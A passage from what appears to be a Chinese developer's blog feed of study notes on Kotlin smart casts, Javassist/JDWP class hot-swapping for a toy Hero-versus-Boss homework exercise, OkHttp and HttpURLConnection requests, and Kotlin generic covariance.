class="language-none">e: E:\ColdRain_Moro\AndroidProject\WanAndroid\app\src\main\java\kim\bifrost\coldrain\wanandroid\view\activity\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>遇事不决问度娘，于是在百度上找到了答案 (<a href="https://www.javaer101.com/article/52202734.html">在Kotlin中无法进行Smart Cast - Javaer101</a>)</p><p>原来这个viewModel变量的类型实际上是LoginViewModel?，也就是它是允许为空的。而我获取的时候是直接以LoginViewModel的形式获取，它没有办法从LoginViewModel?类型smart cast为LoginViewModel。</p><p>那么在调用的时候后面加个?就解决了。</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">binding<span class="token punctuation">.</span>viewModel<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">postLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之所以记录下来，是因为Android Studio没有给之前错误的用法标红，我觉得这个还是应该标个红的。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Javassist &amp; Javagent实现类的热替换</title>
      <link href="/2021/11/19/javassist-hotswap/"/>
      <url>/2021/11/19/javassist-hotswap/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Javassist-amp-Javagent实现类的热替换"><a href="#利用Javassist-amp-Javagent实现类的热替换" class="headerlink" title="利用Javassist &amp; Javagent实现类的热替换"></a>利用Javassist &amp; Javagent实现类的热替换</h1><blockquote><p>几天前写红岩作业的时候，发现其中的一个level非常有意思</p><p>让我们定义一个Hero类，再定义一个Boss类。设定Boss的属性远大于Hero，Hero绝无战胜Boss的可能性</p><p>作业要求是让我们给Hero开个挂，秒杀Boss</p><p>出这个作业的学长大概只是想考察我们对反射的掌握程度，但我发现这个作业可以整花活（因为前段时间研究了ASM和Javassist）</p><p>同时我也想借这个机会解决我之前研究Javassist时碰到的疑惑</p><p>于是就有了这篇文章</p></blockquote><h2 id="Javassist对热替换的实现方式"><a href="#Javassist对热替换的实现方式" class="headerlink" title="Javassist对热替换的实现方式"></a>Javassist对热替换的实现方式</h2><p>我之前研究了很久，到处找资料也没研究出来怎么整。不过这次我终于在网络上找到了线索，并且初步了解了它的原理。</p><blockquote><p>正常来说，只靠Java代码是没法替换一个已经加载到SystemClassLoader里的类的。（如果是别的ClassLoader加载的类，也许可以让加载这个类的ClassLoader不可达再手动调用gc来达到让这个类被作为垃圾回收的目的来删除一个类）但一串神奇的VM Options让我们拥有了从代码层面覆写一个类的能力。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于这行options的作用我并不是很清楚，但它确实让Javassist的Hotswapper类有了连接VM的能力，从此热覆写一个类的字节码便从技术层面可行了。</p><p>美中不足的是只有加了这行Options才能达到效果</p><h2 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * hk.asgard.rain.lesson4.Lv4 * 4thWork * 三种开挂解决方案 * 反射 javassist生成新类 热替换 * * @author 寒雨 * @since 2021/11/18 10:58 **/</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> hero<span class="token operator">:</span> Entity <span class="token operator">=</span> <span class="token function">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> boss <span class="token operator">=</span> <span class="token function">Boss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//    bypass(hero)</span><span class="token comment">//    hero = javassistByPass(hero)</span>    <span class="token function">hotSwap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>boss<span class="token punctuation">.</span>speed <span class="token operator">&gt;</span> hero<span class="token punctuation">.</span>speed<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// Boss 先手 秒杀</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"英雄被Boss秒杀啦"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment">// hero 先手</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hero<span class="token punctuation">.</span>damage <span class="token operator">&gt;=</span> boss<span class="token punctuation">.</span>health<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"英雄开挂秒杀了Boss"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"英雄先手没能干掉Boss，被Boss反杀"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/** * 开挂(反射) */</span><span class="token keyword">fun</span> <span class="token function">bypass</span><span class="token punctuation">(</span>hero<span class="token operator">:</span> Entity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    hero<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"damage"</span><span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>    hero<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"speed"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 用javassist生成新类并加载</span><span class="token keyword">fun</span> <span class="token function">javassistByPass</span><span class="token punctuation">(</span>hero<span class="token operator">:</span> Entity<span class="token punctuation">)</span><span class="token operator">:</span> Entity <span class="token punctuation">{</span>    <span class="token comment">// 获取ctClass</span>    <span class="token keyword">val</span> ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hk.asgard.rain.lesson4.lv4.Hero"</span><span class="token punctuation">)</span>    <span class="token comment">// 改名，否则重复加载会抛异常</span>    ctClass<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"hk.asgard.rain.lesson4.lv4.HeroEdited"</span>    <span class="token comment">// 从ctClass获取方法</span>    <span class="token keyword">val</span> ctMethodDamage <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getDamage"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> ctMethodSpeed <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getSpeed"</span><span class="token punctuation">)</span>    ctMethodDamage<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 999999L;    }"""</span><span class="token punctuation">)</span>    ctMethodSpeed<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 400;    }"""</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> Entity<span class="token punctuation">}</span><span class="token comment">// 热替换</span><span class="token comment">// 需要jvm选项 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 并且implementation tools.jar</span><span class="token keyword">fun</span> <span class="token function">hotSwap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 获取ctClass</span>    <span class="token keyword">val</span> ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hk.asgard.rain.lesson4.lv4.Hero"</span><span class="token punctuation">)</span>    <span class="token comment">// 从ctClass获取方法</span>    <span class="token keyword">val</span> ctMethodDamage <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getDamage"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> ctMethodSpeed <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getSpeed"</span><span class="token punctuation">)</span>    ctMethodDamage<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 999999L;    }"""</span><span class="token punctuation">)</span>    ctMethodSpeed<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token raw-string string">"""{        return 400;    }"""</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> swap <span class="token operator">=</span> <span class="token function">HotSwapper</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>    swap<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token string">"hk.asgard.rain.lesson4.lv4.Hero"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><blockquote><p>使用HotSwapper不止需要导入Javassist库，还需要导入tools.jar</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
            <tag> 外部库 </tag>
            
            <tag> 字节码操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OKHttp/HttpURLConnection使用笔记</title>
      <link href="/2021/11/14/okhttp-usage/"/>
      <url>/2021/11/14/okhttp-usage/</url>
      
        <content type="html"><![CDATA[<h1 id="OKHttp-HttpURLConnection使用笔记"><a href="#OKHttp-HttpURLConnection使用笔记" class="headerlink" title="OKHttp/HttpURLConnection使用笔记"></a>OKHttp/HttpURLConnection使用笔记</h1><p>废话不多说，上代码</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 使用OKHttp提交数据</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">okHttpPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    coroutineScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>IO<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> requestBody <span class="token operator">=</span> FormBody<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"123456"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">val</span> request <span class="token operator">=</span> Request<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>requestBody<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">// 之后操作跟拉取数据一样</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 使用OKHttp拉取数据</span><span class="token comment">// 比HttpUrlConnection好使多了</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">okHttpPull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    coroutineScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>IO<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">val</span> client <span class="token operator">=</span> <span class="token function">OkHttpClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> request <span class="token operator">=</span> Request<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> <span class="token keyword">data</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>body<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">withContext</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>Main<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    binding<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token keyword">data</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token operator">:</span> Exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 使用HttpURLConnection提交数据</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">httpUrlConnectionPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> connection<span class="token operator">:</span> HttpURLConnection<span class="token operator">?</span> <span class="token operator">=</span> <span class="token keyword">null</span>    <span class="token comment">// 网络请求操作 拿到connection</span>    connection<span class="token operator">!!</span><span class="token punctuation">.</span>requestMethod <span class="token operator">=</span> <span class="token string">"POST"</span>    <span class="token keyword">val</span> output <span class="token operator">=</span> <span class="token function">DataOutputStream</span><span class="token punctuation">(</span>connection<span class="token punctuation">.</span>outputStream<span class="token punctuation">)</span>    output<span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span><span class="token string">"username=admin&amp;password=123456"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 使用HttpURLConnection拉取数据</span><span class="token keyword">private</span> <span class="token keyword">fun</span> <span class="token function">httpUrlConnectionPull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 即使使用协程，网络操作也不能在主线程上运行，需要使用Dispatchers.IO</span>    coroutineScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>IO<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> connection<span class="token operator">:</span> HttpURLConnection<span class="token operator">?</span> <span class="token operator">=</span> <span class="token keyword">null</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">val</span> response <span class="token operator">=</span> <span class="token function">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">val</span> url <span class="token operator">=</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span>            connection <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> HttpURLConnection            connection<span class="token punctuation">.</span>connectTimeout <span class="token operator">=</span> <span class="token number">8000</span>            connection<span class="token punctuation">.</span>readTimeout <span class="token operator">=</span> <span class="token number">8000</span>            <span class="token keyword">val</span> input <span class="token operator">=</span> connection<span class="token punctuation">.</span>inputStream            <span class="token keyword">val</span> reader <span class="token operator">=</span> <span class="token function">BufferedReader</span><span class="token punctuation">(</span><span class="token function">InputStreamReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span>            reader<span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span>                reader<span class="token punctuation">.</span><span class="token function">forEachLine</span> <span class="token punctuation">{</span>                    response<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment">// 切回主协程，这样做是因为Dispatcher.IO的协程其实不隶属于主线程</span>            <span class="token function">withContext</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>Main<span class="token punctuation">)</span> <span class="token punctuation">{</span>                binding<span class="token punctuation">.</span>responseText<span class="token punctuation">.</span>text <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token operator">:</span> Exception<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            connection<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> 外部库 </tag>
            
            <tag> 网络操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用OkHttp进行一个json信息的获取</title>
      <link href="/2021/11/14/okhttp-get-json/"/>
      <url>/2021/11/14/okhttp-get-json/</url>
      
        <content type="html"><![CDATA[<h1 id="用OkHttp进行一个json信息的获取"><a href="#用OkHttp进行一个json信息的获取" class="headerlink" title="用OkHttp进行一个json信息的获取"></a>用OkHttp进行一个json信息的获取</h1><p>获取一段json信息，用gson将它格式化，再输出到一个本地json文件里</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * 从请求中获取json字符串，将其格式化输出到文件中 * 使用Gson格式化json字符串 */</span><span class="token keyword">fun</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> gson <span class="token operator">=</span> <span class="token function">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setPrettyPrinting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> client <span class="token operator">=</span> <span class="token function">OkHttpClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> request <span class="token operator">=</span> Request<span class="token punctuation">.</span><span class="token function">Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"https://www.wanandroid.com/article/list/0/json"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> json <span class="token operator">=</span> response<span class="token punctuation">.</span>body<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>json <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> formatted <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Any<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">val</span> file <span class="token operator">=</span> <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">"E:\\data.json"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span> <span class="token punctuation">{</span> <span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token function">FileWriter</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">apply</span> <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>formatted<span class="token punctuation">)</span>            <span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 外部库 </tag>
            
            <tag> 网络操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kotlin 泛型协变/逆变学习笔记</title>
      <link href="/2021/11/13/kotlin-generics-covariation-and-inversion/"/>
      <url>/2021/11/13/kotlin-generics-covariation-and-inversion/</url>
      
        <content type="html"><![CDATA[<h1 id="Kotlin-泛型协变-逆变学习笔记"><a href="#Kotlin-泛型协变-逆变学习笔记" class="headerlink" title="Kotlin 泛型协变/逆变学习笔记"></a>Kotlin 泛型协变/逆变学习笔记</h1><h2 id="协变"><a href="#协变" class="headerlink" title="协变"></a>协变</h2><h3 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h3><p>设想以下情况: Student是Person的子类</p><p>我们定义了一个Data&lt;T&gt;(val data: T)作为容器来存放他们</p><p>函数test接受一个类型为Data&lt;Person&gt;的参数,我们手上有一个类型为Data&lt;Student&gt;的实例</p><p>我们理所当然的把它作为参数传入test函数，却发现编译无法通过</p><p>这时你傻眼了，原来Data&lt;Student&gt;跟本无法作为一个Data&lt;Person&gt;的参数传入函数，也就是没法隐式向下转型</p><p>但我们发现，使用List这样的容器是允许这样做的</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">open</span> <span class="token keyword">class</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> level<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">class</span> Data<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token punctuation">)</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> List<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> Data<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> studentList <span class="token operator">=</span> <span class="token function">arrayListOf</span><span class="token punctuation">(</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>    <span class="token keyword">val</span> <span class="token keyword">data</span> <span class="token operator">=</span> <span class="token function">Data</span><span class="token punctuation">(</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span> <span class="token comment">// 编译不能通过</span>    <span class="token function">test</span><span class="token punctuation">(</span>studentList<span class="token punctuation">)</span> <span class="token comment">// 编译可以通过</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是因为List这个类型用到了泛型的协变，这类问题我们应该使用泛型的协变来处理</p><p>实际上Java为了杜绝安全隐患，是不允许这样传递参数的。换句话说，即使 Student是Person的子类，SimpleData并不是SimpleData的子 类。</p><p>但稍作思考，像crossinline那样，我们可以做一个约定来避免类型转换的安全隐患。如果我们约定泛型T是只读的话（也就是不能改变)，也就能避免类型转换的安全隐患，但那样就意味着我们这个类的参数中不能含有泛型。这样持有泛型的类型便会拥有泛型类型的继承关系。</p><p>这里引用一下《第一行代码: 第三版》中对泛型协变的定义</p><blockquote><p>假如定义了一个MyClass的泛型类，其中A 是B的子类型，同时MyClass<a>又是MyClass<b>的子类型，那么我们就可以称MyClass在T这个泛型上是协变的。</b></a></p><a><b></b></a></blockquote><a><b></b></a><b><h3 id="屁话多！如何使用"><a></a><a href="#屁话多！如何使用" class="headerlink" title="屁话多！如何使用"></a>屁话多！如何使用</h3><p>只需要在声明泛型时在前面加上out修饰符即可，之后你便需要遵守协变的约定</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">open</span> <span class="token keyword">class</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> level<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token 